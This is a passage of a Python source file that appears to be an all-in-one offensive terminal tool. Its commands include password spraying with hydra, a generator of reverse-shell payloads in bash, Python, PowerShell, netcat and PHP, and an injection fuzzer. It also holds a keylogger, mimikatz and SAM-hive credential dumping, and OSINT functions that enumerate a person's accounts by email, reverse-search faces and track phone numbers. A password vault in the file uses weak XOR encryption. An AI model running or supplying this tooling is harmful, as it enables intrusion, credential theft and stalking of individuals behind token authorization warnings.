        pe(f'  User list not found: {userlist}')
        return
    if shutil.which('hydra'):
        p(f'  Spraying {target} with password: {password}', DM)
        p('  (1 password per user — avoids account lockouts)', DM)
        print()
        shell_exec(f'hydra -L {userlist} -p {password} -t 4 {target}')
    else:
        pe('  hydra not found.  brew install hydra  /  apt install hydra')

# ── BACKDOOR ──────────────────────────────────────────────────────────────────
def cmd_backdoor(args):
    pw('  ⚠  Only use on systems you own. For security testing only.')
    print()
    host = args[0] if args else input(f'  {G}Listener IP (your IP):{RST} ').strip()
    port = args[1] if len(args) > 1 else input(f'  {G}Listener port:{RST} ').strip()
    print()
    p('  ── Generated Payloads ───────────────────────────────', CY)
    print()
    payloads = {
        'bash':       f'bash -i >& /dev/tcp/{host}/{port} 0>&1',
        'python3':    f'python3 -c \'import socket,subprocess,os;s=socket.socket();s.connect(("{host}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
        'powershell': f'powershell -nop -c "$c=New-Object Net.Sockets.TCPClient(\'{host}\',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length))-ne 0){{$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+\'PS \'+(pwd).Path+\'> \';$x=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($x,0,$x.Length)}}"',
        'nc':         f'nc -e /bin/sh {host} {port}',
        'php':        f'php -r \'$s=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3");\'',
    }
    for name, payload in payloads.items():
        print(f'  {G}[{name}]{RST}')
        print(f'  {DM}{payload[:100]}{"..." if len(payload)>100 else ""}{RST}')
        print()
    p(f'  Start listener with:  nc -lvnp {port}', CY)
    print()

# ── TUNNEL ────────────────────────────────────────────────────────────────────
def cmd_tunnel(args):
    if len(args) < 2:
        pb('  Usage: tunnel <ssh-host> <local-port>:<remote-host>:<remote-port>')
        pd('  tunnel user@vps.com 8080:192.168.1.1:80')
        pd('  tunnel user@vps.com 3306:localhost:3306')
        return
    ssh_host  = args[0]
    port_spec = args[1]
    print()
    p(f'  Creating SSH tunnel via {ssh_host}...', DM)
    p(f'  Port mapping: {port_spec}', DM)
    print()
    if shutil.which('ssh'):
        parts = port_spec.split(':')
        if len(parts) == 3:
            local_port, remote_host, remote_port = parts
            shell_exec(f'ssh -N -L {local_port}:{remote_host}:{remote_port} {ssh_host}')
        else:
            pe('  Invalid port spec. Use local:remote-host:remote-port')
    else:
        pe('  ssh not found.')

# ── PASS (Password Manager) ───────────────────────────────────────────────────
def cmd_pass(args):
    import base64 as _b64, hashlib as _hl
    vault_path = os.path.join(os.path.expanduser('~'), '.atomic', 'vault.json')

    def load_vault(key):
        if not os.path.exists(vault_path):
            return {}
        try:
            with open(vault_path) as f:
                data = json.load(f)
            # Simple XOR decrypt with key hash
            k = _hl.sha256(key.encode()).digest()
            vault = {}
            for name, enc in data.items():
                raw = _b64.b64decode(enc)
                dec = ''.join(chr(raw[i] ^ k[i % len(k)]) for i in range(len(raw)))
                vault[name] = dec
            return vault
        except Exception:
            return {}

    def save_vault(vault, key):
        k = _hl.sha256(key.encode()).digest()
        data = {}
        for name, val in vault.items():
            enc = bytes([ord(c) ^ k[i % len(k)] for i, c in enumerate(val)])
            data[name] = _b64.b64encode(enc).decode()
        with open(vault_path, 'w') as f:
            json.dump(data, f)

    sub = args[0] if args else ''
    if sub not in ('add','get','list','del',''):
        pb('  Usage: pass [add|get|list|del]')
        return

    key = getpass.getpass(f'  {G}Vault password:{RST} ')
    vault = load_vault(key)
    print()

    if sub == 'list' or sub == '':
        if not vault:
            p('  Vault is empty.', DM)
        else:
            p(f'  {len(vault)} stored credential(s):', CY)
            for name in vault:
                print(f'  {G}●{RST}  {WH}{name}{RST}')
    elif sub == 'add':
        name = input(f'  {G}Name (e.g. github):{RST} ').strip()
        val  = getpass.getpass(f'  {G}Password/secret:{RST} ')
        vault[name] = val
        save_vault(vault, key)
        p(f'  Saved: {name}', G)
    elif sub == 'get':
        name = args[1] if len(args) > 1 else input(f'  {G}Name:{RST} ').strip()
        if name in vault:
            print(f'  {G}{name}{RST}  →  {WH}{vault[name]}{RST}')
        else:
            pe(f'  Not found: {name}')
    elif sub == 'del':
        name = args[1] if len(args) > 1 else input(f'  {G}Name:{RST} ').strip()
        if name in vault:
            del vault[name]
            save_vault(vault, key)
            p(f'  Deleted: {name}', G)
        else:
            pe(f'  Not found: {name}')
    print()

# ── FUZZ ──────────────────────────────────────────────────────────────────────
def cmd_fuzz(args):
    if not args:
        pb('  Usage: fuzz <url>')
        pd('  fuzz http://192.168.1.1/page?id=FUZZ')
        pd('  (put FUZZ where you want to inject)')
        return
    url = args[0]
    pw('  ⚠  Only test systems you own or have written authorization to test.')
    print()
    if shutil.which('ffuf'):
        wl = next((w for w in ['/usr/share/wordlists/common.txt',
                                '/usr/share/seclists/Discovery/Web-Content/common.txt',
                                'wordlist.txt'] if os.path.exists(w)), None)
        if wl:
            shell_exec(f'ffuf -u {url} -w {wl} -c')
        else:
            pe('  No wordlist found. Place common.txt in current directory.')
    elif shutil.which('wfuzz'):
        shell_exec(f'wfuzz -z file,/usr/share/wordlists/common.txt {url}')
    else:
        # Built-in basic fuzzer
        p('  ffuf/wfuzz not found — running built-in fuzzer...', DM)
        print()
        payloads = ["'","\"","<script>alert(1)</script>","1 OR 1=1","../../../etc/passwd",
                    "{{7*7}}","${7*7}",";ls","| ls","` ls`","<img src=x onerror=alert(1)>",
                    "%00","null","undefined","true","false","9999999999","-1"]
        try:
            import requests as _req
            for payload in payloads:
                test_url = url.replace('FUZZ', payload) if 'FUZZ' in url else url + payload
                try:
                    r = _req.get(test_url, timeout=5, headers={'User-Agent':'Mozilla/5.0'})
                    flag = f'{RD}[{r.status_code}]{RST}' if r.status_code not in [200,301,302] else f'{G}[{r.status_code}]{RST}'
                    print(f'  {flag}  {DM}{payload:<40}{RST}  {WH}{len(r.content)} bytes{RST}')
                except Exception:
                    print(f'  {YL}[ERR]{RST}  {DM}{payload}{RST}')
        except ImportError:
            pe('  requests not installed.')

# ── RECON ─────────────────────────────────────────────────────────────────────
def cmd_recon(args):
    if not args:
        pb('  Usage: recon <domain>')
        pd('  recon example.com')
        return
    domain = args[0]
    pw('  ⚠  Only recon systems you own or have authorization to test.')
    print()
    p(f'  Target: {domain}', CY)
    print()
    p('  ── DNS & IP ─────────────────────────────────────────', DM)
    try:
        ip = socket.gethostbyname(domain)
        print(f'  {CY}IP       {RST}  {WH}{ip}{RST}')
    except Exception: pass
    if shutil.which('dig'):
        shell_exec(f'dig {domain} ANY +short')
    print()
    p('  ── Subdomains ───────────────────────────────────────', DM)
    if shutil.which('gobuster'):
        wl = next((w for w in ['/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt',
                                '/usr/share/wordlists/subdomains.txt','subdomains.txt'] if os.path.exists(w)), None)
        if wl:
            shell_exec(f'gobuster dns -d {domain} -w {wl} -t 50')
        else:
            p('  No subdomain wordlist. Place subdomains.txt in current dir.', DM)
    else:
        subs = ['www','mail','api','dev','staging','admin','vpn','portal','shop','app','blog','cdn','static']
        for sub in subs:
            try:
                ip = socket.gethostbyname(f'{sub}.{domain}')
                print(f'  {G}●{RST}  {WH}{sub}.{domain:<35}{RST}  {DM}{ip}{RST}')
            except Exception: pass
    print()
    p('  ── Tech Stack ───────────────────────────────────────', DM)
    try:
        import requests as _req
        r = _req.get(f'https://{domain}', timeout=8, headers={'User-Agent':'Mozilla/5.0'})
        headers = r.headers
        for h in ['Server','X-Powered-By','X-Framework','X-Generator','Via']:
            if h in headers:
                print(f'  {CY}{h:<20}{RST}  {WH}{headers[h]}{RST}')
        if 'wordpress' in r.text.lower(): print(f'  {G}CMS{RST}              WordPress')
        if 'shopify'   in r.text.lower(): print(f'  {G}CMS{RST}              Shopify')
        if 'drupal'    in r.text.lower(): print(f'  {G}CMS{RST}              Drupal')
    except Exception: pass
    print()
    p('  ── Open Ports ───────────────────────────────────────', DM)
    if shutil.which('nmap'):
        shell_exec(f'nmap -T4 --open -F {domain}')
    print()
    p('  ── Emails (Google dork) ─────────────────────────────', DM)
    p(f'  Search manually: site:{domain} "@{domain}"', DM)
    print()

# ── KEYLOG ────────────────────────────────────────────────────────────────────
def cmd_keylog(args):
    pw('  ⚠  Only use on your own system. Keylogging others is illegal.')
    print()
    duration = int(args[0]) if args and args[0].isdigit() else 30
    p(f'  Recording keystrokes for {duration} seconds on this machine...', DM)
    p('  Press Ctrl+C to stop early.', DM)
    print()
    try:
        from pynput import keyboard as _kb
        keys = []
        def on_press(key):
            try:    keys.append(str(key.char))
            except: keys.append(f'[{key}]')
        listener = _kb.Listener(on_press=on_press)
        listener.start()
        time.sleep(duration)
        listener.stop()
        print()
        p('  Captured keystrokes:', CY)
        print(f'  {WH}{"".join(keys)}{RST}')
        log_path = os.path.join(os.path.expanduser('~'), '.atomic', 'keylog.txt')
        with open(log_path, 'a') as f:
            f.write(f'\n[{datetime.now()}]\n{"".join(keys)}\n')
        p(f'  Saved to: {log_path}', DM)
    except ImportError:
        pe('  pynput not installed.')
        p('  Install: pip install pynput', DM)
    except Exception as e:
        pe(f'  Error: {e}')
    print()

# ── MIMIKATZ (Windows only) ───────────────────────────────────────────────────
def cmd_mimikatz(args):
    if OS_NAME != 'Windows':
        pe('  mimikatz is Windows only.')
        p('  On Linux/Mac use: sudo grep -i password /etc/shadow', DM)
        return
    pw('  ⚠  Only run on systems you own. Requires Admin privileges.')
    print()
    if shutil.which('mimikatz'):
        shell_exec('mimikatz "privilege::debug" "sekurlsa::logonpasswords" "exit"')
    else:
        p('  mimikatz not found.', DM)
        p('  Download from: github.com/gentilkiwi/mimikatz/releases', DM)
        print()
        p('  Alternative — dump with built-in tools:', CY)
        shell_exec('reg save HKLM\\SAM sam.hive && reg save HKLM\\SYSTEM system.hive')
        p('  Transfer sam.hive + system.hive and crack with secretsdump.py', DM)
    print()

# ── REPORT ────────────────────────────────────────────────────────────────────
def cmd_report(args):
    p('  Generating pentest report from session activity...', DM)
    print()
    report_path = os.path.join(os.path.expanduser('~'), '.atomic', 'report.txt')
    log_path    = os.path.join(os.path.expanduser('~'), '.atomic', 'session_log.json')

    lines = []
    lines.append('=' * 60)
    lines.append('  ATOMIC TERMINAL — PENTEST REPORT')
    lines.append(f'  Generated: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}')
    lines.append(f'  Operator:  {SESSION.get("displayName","?")}')
    lines.append(f'  OS:        {platform.platform()}')
    lines.append('=' * 60)
    lines.append('')
    lines.append('SCOPE & AUTHORIZATION')
    lines.append('-' * 40)
    lines.append('  Target systems: [fill in]')
    lines.append('  Authorization:  [fill in]')
    lines.append('  Scope:          [fill in]')
    lines.append('')
    lines.append('COMMANDS RUN THIS SESSION')
    lines.append('-' * 40)

    # Pull from Firebase logs if possible
    try:
        import requests as _req
        username = SESSION.get('uid','')
        r = _req.get(f'{FB_DB_URL}/terminal_logs/{username}.json', timeout=8)
        if r.ok and r.json():
            logs = r.json()
            for ts, entry in list(logs.items())[-50:]:
                cmd  = entry.get('cmd','')
                args_r = entry.get('args','')
                time_r = entry.get('time','')
                lines.append(f'  [{time_r}]  {cmd} {args_r}')
        else:
            lines.append('  (no Firebase logs found)')
    except Exception:
        lines.append('  (could not fetch logs)')

    lines.append('')
    lines.append('FINDINGS')
    lines.append('-' * 40)
    lines.append('  [HIGH]   ')
    lines.append('  [MED]    ')
    lines.append('  [LOW]    ')
    lines.append('  [INFO]   ')
    lines.append('')
    lines.append('RECOMMENDATIONS')
    lines.append('-' * 40)
    lines.append('  1. ')
    lines.append('  2. ')
    lines.append('  3. ')
    lines.append('')
    lines.append('=' * 60)

    with open(report_path, 'w') as f:
        f.write('\n'.join(lines))

    for line in lines:
        print(f'  {DM}{line}{RST}')

    print()
    p(f'  Report saved to: {report_path}', G)
    print()

# ── HASHID ────────────────────────────────────────────────────────────────────
def cmd_hashid(args):
    if not args:
        pb('  Usage: hashid <hash>')
        pd('  hashid 5f4dcc3b5aa765d61d8327deb882cf99')
        return
    h = args[0].strip()
    print()
    p(f'  Hash: {h}', DM)
    print()
    matches = []
    l = len(h)
    hx = bool(re.fullmatch(r'[a-fA-F0-9]+', h))

    # Pattern matching
    checks = [
        (r'[a-fA-F0-9]{32}',   'MD5',          '0',    'Very common — passwords, files'),
        (r'[a-fA-F0-9]{32}',   'MD4',          '900',  'Older Windows NTLM variant'),
        (r'[a-fA-F0-9]{32}',   'NTLM',         '1000', 'Windows credential hash'),
        (r'[a-fA-F0-9]{40}',   'SHA-1',        '100',  'Git commits, older passwords'),
        (r'[a-fA-F0-9]{56}',   'SHA-224',      '1300', 'SHA-2 family'),
        (r'[a-fA-F0-9]{64}',   'SHA-256',      '1400', 'Modern standard'),
        (r'[a-fA-F0-9]{96}',   'SHA-384',      '10800','SHA-2 family'),
        (r'[a-fA-F0-9]{128}',  'SHA-512',      '1700', 'Strong, used in Linux /etc/shadow'),
        (r'[a-fA-F0-9]{64}',   'SHA3-256',     '17300','SHA-3 family'),
        (r'[a-fA-F0-9]{128}',  'SHA3-512',     '17500','SHA-3 family'),
        (r'[a-fA-F0-9]{32}',   'LM',           '3000', 'Legacy Windows — extremely weak'),
        (r'\$1\$.{0,8}\$.{22}','MD5crypt',     '500',  'Old Linux passwords'),
        (r'\$5\$.+\$.{43}',    'SHA-256crypt', '7400', 'Modern Linux /etc/shadow'),
        (r'\$6\$.+\$.{86}',    'SHA-512crypt', '1800', 'Modern Linux /etc/shadow'),
        (r'\$2[aby]\$\d+\$.{53}','bcrypt',     '3200', 'Slow hash — very hard to crack'),
        (r'\$argon2.+',        'Argon2',       None,   'Memory-hard — very hard to crack'),
        (r'[a-fA-F0-9]{40}',   'MySQL4+',      '300',  'MySQL password hash'),
        (r'\*[A-F0-9]{40}',    'MySQL5+',      '300',  'MySQL5 password hash'),
        (r'[a-zA-Z0-9+/]{27}=','Base64-MD5',   None,   'Base64-encoded MD5'),
        (r'[a-fA-F0-9]{16}',   'MySQL3/DES',   '3100', 'Very old MySQL'),
        (r'[a-fA-F0-9]{48}',   'Haval-192',    None,   'Rare'),
        (r'[a-fA-F0-9]{56}',   'Haval-224/SHA-224', '1300', 'SHA-2 family or Haval'),
    ]
    for pattern, name, hc_mode, note in checks:
        if re.fullmatch(pattern, h):
            matches.append((name, hc_mode, note))

    if not matches:
        pe('  Could not identify hash type.')
        p('  It may be a custom/salted hash or encoding.', DM)
    else:
        p(f'  {len(matches)} possible type(s):', CY)
        print()
        for name, mode, note in matches:
            mode_str = f'hashcat -m {mode}' if mode else 'no hashcat mode'
            print(f'  {G}[{name}]{RST}')
            print(f'  {DM}  {note}{RST}')
            print(f'  {DM}  Crack: {mode_str}{RST}')
            print()
        if matches:
            best = matches[0]
            p(f'  Most likely: {best[0]}', YL)
            if best[1]:
                p(f'  Quick crack: crack {h}', DM)
    print()

# ── FACESEARCH ────────────────────────────────────────────────────────────────
def cmd_facesearch(args):
    if not args:
        pb('  Usage: facesearch <image-path>')
        pd('  Drag photo onto terminal window then press Enter')
        pd('  facesearch /path/to/photo.jpg')
        return

    path = ' '.join(args).strip().strip("'\"")
    # Handle escaped spaces from terminal drag-drop (e.g. Africa\ JFK)
    path = path.replace('\\ ', ' ')
    if not os.path.exists(path):
        # Try expanding ~ and env vars
        path = os.path.expandvars(os.path.expanduser(path))
    if not os.path.exists(path):
        pe(f'  File not found: {path}')
        p('  Tip: drag the photo onto the terminal — it pastes the path automatically.', DM)
        return

    # Try to show image in iTerm2
    try:
        import base64 as _b64
        term = os.environ.get('TERM_PROGRAM','')
        if term == 'iTerm.app':
            with open(path, 'rb') as f:
                img_data = _b64.b64encode(f.read()).decode()
            size = os.path.getsize(path)
            print(f'\033]1337;File=inline=1;size={size};width=30;height=10:{img_data}\a')
            print()
    except Exception:
        pass

    try:
        import requests as _req
    except ImportError:
        pe('  requests not installed.'); return

    fname = os.path.basename(path)
    p(f'  Image: {fname}', CY)
    print()

    # Upload to Imgur to get a public URL for searching
    public_url = None
    p('  Uploading image for reverse search...', DM)
    try:
        with open(path, 'rb') as f:
            r = _req.post('https://api.imgur.com/3/image',
                         headers={'Authorization': 'Client-ID 546c25a59c58ad7'},
                         files={'image': f}, timeout=20)
        if r.ok:
            public_url = r.json()['data']['link']
            p(f'  Uploaded: {public_url}', G)
    except Exception as e:
        p(f'  Upload failed: {e}', DM)

    print()
    p('  ── Reverse Image Search ─────────────────────────────', DM)
    print()

    search_urls = {}
    if public_url:
        search_urls = {
            'Google':  f'https://www.google.com/searchbyimage?image_url={public_url}',
            'Bing':    f'https://www.bing.com/images/search?view=detailv2&iss=sbi&q=imgurl:{public_url}',
            'TinEye':  f'https://tineye.com/search?url={public_url}',
            'Yandex':  f'https://yandex.com/images/search?url={public_url}&rpt=imageview',
            'PimEyes': f'https://pimeyes.com/en',
        }
    else:
        # Fallback — give manual search URLs
        search_urls = {
            'Google':  'https://images.google.com (upload manually)',
            'TinEye':  'https://tineye.com (upload manually)',
            'Yandex':  'https://yandex.com/images (upload manually — best for faces)',
            'PimEyes': 'https://pimeyes.com (best facial recognition — paid)',
        }

    for engine, url in search_urls.items():
        print(f'  {G}[{engine}]{RST}')
        print(f'  {DM}  {url}{RST}')
        print()

    # Search social media for the image via scraping
    if public_url:
        print()
        p('  ── Scanning Social Platforms ────────────────────────', DM)
        print()
        platforms = {
            'Instagram': f'https://www.instagram.com/web/search/topsearch/?query={fname}',
            'Reddit':    f'https://www.reddit.com/search.json?q={fname}&type=link',
        }
        for name, url in platforms.items():
            try:
                r = _req.get(url, timeout=6, headers={'User-Agent':'Mozilla/5.0'})
                if r.ok and len(r.content) > 100:
                    print(f'  {G}✓{RST}  {WH}{name}{RST}  {DM}got response{RST}')
                else:
                    print(f'  {DM}○  {name} — no results{RST}')
            except Exception:
                print(f'  {YL}?{RST}  {DM}{name} — timeout{RST}')

    # Tor search if available
    print()
    tor_running = False
    for port in [9050, 9150]:
        try:
            s = socket.create_connection(('127.0.0.1', port), timeout=2)
            s.close(); tor_running = True; break
        except Exception: pass

    if tor_running and public_url:
        p('  ── Tor Search ───────────────────────────────────────', DM)
        try:
            proxies = {'http': 'socks5h://127.0.0.1:9050', 'https': 'socks5h://127.0.0.1:9050'}
            r = _req.get(f'https://ahmia.fi/search/?q={fname}',
                        proxies=proxies, timeout=20,
                        headers={'User-Agent':'Mozilla/5.0'})
            if r.ok:
                p('  Tor search complete.', G)
            else:
                p('  No Tor results.', DM)
        except Exception:
            p('  Tor search failed.', DM)
    elif not tor_running:
        p('  Tor not running — skipping dark web search.', DM)
        p('  Start Tor for dark web scan: brew install tor && tor', DM)

    print()
    p('  Note: Yandex has the best face matching. PimEyes is best for facial recognition across the web.', DM)
    print()

# ── LOOKUP ────────────────────────────────────────────────────────────────────
def cmd_lookup(args):
    if not args:
        pb('  Usage: lookup <full name | email | username>')
        pd('  lookup "John Smith"')
        pd('  lookup john@email.com')
        return

    target = ' '.join(args).strip().strip('"\'')
    print()
    p(f'  Target: {target}', CY)
    print()

    try:
        import requests as _req
    except ImportError:
        pe('  requests not installed.'); return

    is_email = '@' in target and '.' in target.split('@')[-1]

    # ── Breach check
    p('  ── Breach Databases ─────────────────────────────────', DM)
    if is_email:
        try:
            r = _req.get(
                f'https://haveibeenpwned.com/api/v3/breachedaccount/{target}',
                headers={'User-Agent': 'Atomic-OSINT', 'hibp-api-key': ''},
                timeout=8
            )
            if r.status_code == 200:
                breaches = r.json()
                pw(f'  Found in {len(breaches)} breach(es):')
                for b in breaches:
                    print(f'  {RD}●{RST}  {WH}{b.get("Name","?"):<25}{RST}  {DM}{b.get("BreachDate","")}{RST}  {DM}{", ".join(b.get("DataClasses",[])[:3])}{RST}')
            elif r.status_code == 404:
                p('  Not found in any known breaches.', G)
            else:
                p('  HIBP requires API key — check haveibeenpwned.com manually.', DM)
        except Exception as e:
            p(f'  Breach check failed: {e}', DM)
    else:
        try:
            r = _req.get(f'https://psbdmp.ws/api/v3/search/{target.replace(" ","+")}',
                        timeout=8, headers={'User-Agent':'Mozilla/5.0'})
            if r.ok:
                data = r.json()
                if data.get('data'):
                    pw(f'  Found in {len(data["data"])} paste(s):')
                    for paste in data['data'][:5]:
                        print(f'  {RD}●{RST}  {DM}https://pastebin.com/{paste.get("id","?")}{RST}')
                else:
                    p('  Not found in public pastes.', G)
        except Exception:
            p('  Paste search unavailable.', DM)

    print()

    # ── Email Registration Check (only for emails)
    discovered_usernames = []  # list of (platform, username, url)

    if is_email:
        import hashlib as _hl
        email_hash = _hl.md5(target.lower().strip().encode()).hexdigest()

        p('  ── Email Registration Check ─────────────────────────', DM)
        p('  Checking if this email is registered on platforms...', DM)
        print()

        # Gravatar
        try:
            r = _req.get(f'https://www.gravatar.com/{email_hash}.json', timeout=6,
                        headers={'User-Agent':'Mozilla/5.0'})
            if r.status_code == 200:
                entry = r.json().get('entry', [{}])[0]
                display = entry.get('displayName') or entry.get('preferredUsername','')
                profile = entry.get('profileUrl', f'https://gravatar.com/{email_hash}')
                print(f'  {G}✓{RST}  {WH}Gravatar{RST:<16}  username: {G}{display}{RST}')
                print(f'       {DM}{profile}{RST}')
                if display:
                    discovered_usernames.append(('Gravatar', display, profile))
            else:
                print(f'  {DM}✗  Gravatar — not registered{RST}')
        except Exception:
            print(f'  {YL}?{RST}  {DM}Gravatar (timeout){RST}')

        # GitHub (works if user made email public)
        try:
            r = _req.get(
                f'https://api.github.com/search/users?q={target}+in:email',
                headers={'Accept':'application/vnd.github.v3+json','User-Agent':'Atomic-OSINT'},
                timeout=8
            )
            if r.status_code == 200:
                items = r.json().get('items', [])
                if items:
                    u = items[0]
                    login = u.get('login','')
                    url   = u.get('html_url', f'https://github.com/{login}')
                    print(f'  {G}✓{RST}  {WH}GitHub{RST:<18}  username: {G}{login}{RST}')
                    print(f'       {DM}{url}{RST}')
                    discovered_usernames.append(('GitHub', login, url))
                else:
                    print(f'  {DM}✗  GitHub — email not public / not found{RST}')
            else:
                print(f'  {DM}✗  GitHub — {r.status_code}{RST}')
        except Exception:
            print(f'  {YL}?{RST}  {DM}GitHub (timeout){RST}')

        # Duolingo (open API)
        try:
            r = _req.get(f'https://www.duolingo.com/2017-06-30/users?email={target}',
                        headers={'User-Agent':'Mozilla/5.0'}, timeout=8)
            if r.status_code == 200:
                users = r.json().get('users', [])
                if users:
                    uname = users[0].get('username','')
                    url   = f'https://duolingo.com/profile/{uname}'
                    print(f'  {G}✓{RST}  {WH}Duolingo{RST:<16}  username: {G}{uname}{RST}')
                    print(f'       {DM}{url}{RST}')
                    discovered_usernames.append(('Duolingo', uname, url))
                else:
                    print(f'  {DM}✗  Duolingo — not registered{RST}')
            else:
                print(f'  {DM}✗  Duolingo — not registered{RST}')
        except Exception:
            print(f'  {YL}?{RST}  {DM}Duolingo (timeout){RST}')

        # Microsoft / Skype (IfExistsResult: 0=exists, 1=not found)
        try:
            r = _req.post(
                'https://login.live.com/GetCredentialType.srf',
                json={'username': target, 'isOtherIdpSupported': True,
                      'checkPhones': False, 'isRemoteNGCSupported': True,
                      'isCookieBannerShown': False, 'isFidoSupported': True,
                      'originalRequest': ''},
                headers={'Content-Type':'application/json','User-Agent':'Mozilla/5.0'},
                timeout=8
            )
            if r.status_code == 200:
                result = r.json().get('IfExistsResult', -1)
                if result == 0 or result == 6:
                    print(f'  {G}✓{RST}  {WH}Microsoft/Skype{RST:<9}  email is registered (Outlook/Hotmail/Skype)')
                    discovered_usernames.append(('Microsoft', target, 'https://outlook.com'))
                elif result == 1:
                    print(f'  {DM}✗  Microsoft/Skype — not registered{RST}')
                else:
                    print(f'  {DM}✗  Microsoft/Skype — throttled or unknown{RST}')
        except Exception:
            print(f'  {YL}?{RST}  {DM}Microsoft (timeout){RST}')

        # Spotify (validate endpoint: status 20=available, 1=taken)
        try:
            r = _req.get(
                f'https://spclient.wg.spotify.com/signup/public/v1/account?validate=1&email={target}',
                headers={'User-Agent':'Mozilla/5.0', 'app-platform':'Browser'},
                timeout=8
            )
            if r.status_code == 200:
                data = r.json()
                if data.get('status') == 20 and data.get('can_use_email') is False:
                    print(f'  {G}✓{RST}  {WH}Spotify{RST:<17}  email is registered (username unknown)')
                    discovered_usernames.append(('Spotify', '?', 'https://spotify.com'))
                elif not data.get('can_use_email', True):
                    print(f'  {G}✓{RST}  {WH}Spotify{RST:<17}  email is registered (username unknown)')
                    discovered_usernames.append(('Spotify', '?', 'https://spotify.com'))
                else:
                    print(f'  {DM}✗  Spotify — not registered{RST}')
        except Exception:
            print(f'  {YL}?{RST}  {DM}Spotify (check blocked){RST}')

        # Instagram (create-account attempt reveals if email is taken)
        try:
            sess = _req.Session()
            sess.get('https://www.instagram.com/', timeout=6,
                     headers={'User-Agent':'Mozilla/5.0'})
            csrf = sess.cookies.get('csrftoken','missing')
            r2 = sess.post(
                'https://www.instagram.com/accounts/web_create_ajax/attempt/',
                data={'email': target, 'username': '', 'first_name': '',
                      'opt_into_one_tap': 'false'},
                headers={'User-Agent':'Mozilla/5.0','X-CSRFToken':csrf,
                         'X-Requested-With':'XMLHttpRequest',
                         'Referer':'https://www.instagram.com/'},
                timeout=8
            )
            if r2.status_code == 200:
                errs = r2.json().get('errors', {})
                email_errs = [e.get('code','') for e in errs.get('email', [])]
                if 'email_is_taken' in email_errs:
                    print(f'  {G}✓{RST}  {WH}Instagram{RST:<15}  email is registered (look up manually for username)')
                    discovered_usernames.append(('Instagram','?','https://instagram.com'))
                else:
                    print(f'  {DM}✗  Instagram — not registered{RST}')
            else:
                print(f'  {DM}✗  Instagram — {r2.status_code}{RST}')
        except Exception:
            print(f'  {YL}?{RST}  {DM}Instagram (check blocked){RST}')

        print()
        if discovered_usernames:
            p(f'  ✓ Email registered on {len(discovered_usernames)} platform(s):', G)
            for plat, uname, url in discovered_usernames:
                u_display = uname if uname != '?' else f'{DM}(username hidden — check manually){RST}'
                print(f'  {G}●{RST}  {WH}{plat:<14}{RST}  {CY}{u_display}{RST}')
        else:
            p('  Email not found on any checked platforms.', DM)
        print()

    # ── Social media scan with discovered usernames (email) or the given username/name
    p('  ── Social Media Scan ────────────────────────────────', DM)
    print()

    if is_email:
        scan_usernames = list(dict.fromkeys(
            u for _, u, _ in discovered_usernames if u and u != '?'
        ))
        if not scan_usernames:
            p('  No confirmed usernames to scan — provide a username directly for social scan.', DM)
            print()
            scan_usernames = []
    else:
        scan_usernames = [target.replace(' ','').lower()]

    all_found = []
    for username in scan_usernames:
        p(f'  Scanning: {username}', DM)
        platforms = {
            'GitHub':     f'https://github.com/{username}',
            'Twitter/X':  f'https://twitter.com/{username}',
            'Instagram':  f'https://instagram.com/{username}',
            'Reddit':     f'https://reddit.com/user/{username}',
            'TikTok':     f'https://tiktok.com/@{username}',
            'YouTube':    f'https://youtube.com/@{username}',
            'Twitch':     f'https://twitch.tv/{username}',
            'LinkedIn':   f'https://linkedin.com/in/{username}',
            'Pinterest':  f'https://pinterest.com/{username}',
            'Snapchat':   f'https://snapchat.com/add/{username}',
            'Telegram':   f'https://t.me/{username}',
            'Steam':      f'https://steamcommunity.com/id/{username}',
            'HackerNews': f'https://news.ycombinator.com/user?id={username}',
            'Pastebin':   f'https://pastebin.com/u/{username}',
            'VK':         f'https://vk.com/{username}',
            'Mastodon':   f'https://mastodon.social/@{username}',
            'Tumblr':     f'https://www.tumblr.com/{username}',
            'Flickr':     f'https://flickr.com/people/{username}',
            'Medium':     f'https://medium.com/@{username}',
            'DevTo':      f'https://dev.to/{username}',
            'Gitlab':     f'https://gitlab.com/{username}',
            'Spotify':    f'https://open.spotify.com/user/{username}',
            'BeReal':     f'https://bere.al/{username}',
        }
        for name, url in platforms.items():
            try:
                r = _req.get(url, timeout=5, headers={'User-Agent':'Mozilla/5.0'},
                            allow_redirects=True)
                if r.status_code == 200 and 'not found' not in r.text.lower()[:500]:
                    all_found.append((name, url))
                    print(f'  {G}✓{RST}  {WH}{name:<14}{RST}  {DM}{url}{RST}')
                else:
                    print(f'  {DM}✗  {name}{RST}')
            except Exception:
                print(f'  {YL}?{RST}  {DM}{name} (timeout){RST}')
        print()

    if scan_usernames:
        p(f'  Found on {len(all_found)} platform(s).', G if all_found else DM)

    # ── Google dork
    print()
    p('  ── Google Dorks ─────────────────────────────────────', DM)
    dorks = [
        f'"{target}" site:linkedin.com',
        f'"{target}" site:facebook.com',
        f'"{target}" site:instagram.com',
        f'"{target}" site:tiktok.com',
        f'"{target}" filetype:pdf',
        f'"{target}" password OR leak OR breach',
        f'"{target}" pastebin.com OR ghostbin.co',
    ]
    for dork in dorks:
        print(f'  {G}→{RST}  {DM}google.com/search?q={dork.replace(" ","+")}{RST}')
    print()

# ── TRACK (phone) ─────────────────────────────────────────────────────────────
def cmd_track(args):
    if not args:
        pb('  Usage: track <phone-number>')
        pd('  track +447911123456')
        pd('  track 15551234567')
        return

    number = ''.join(c for c in ' '.join(args) if c.isdigit() or c == '+')
    if not number.startswith('+'):
        number = '+' + number
    print()
    p(f'  Number: {number}', CY)
    print()

    try:
        import requests as _req
    except ImportError:
        pe('  requests not installed.'); return

    # Country/carrier from number prefix
    country_codes = {
        '+1':'US/Canada','+7':'Russia','+20':'Egypt','+27':'South Africa',
        '+30':'Greece','+31':'Netherlands','+32':'Belgium','+33':'France',
        '+34':'Spain','+36':'Hungary','+39':'Italy','+40':'Romania',
        '+41':'Switzerland','+43':'Austria','+44':'UK','+45':'Denmark',
        '+46':'Sweden','+47':'Norway','+48':'Poland','+49':'Germany',
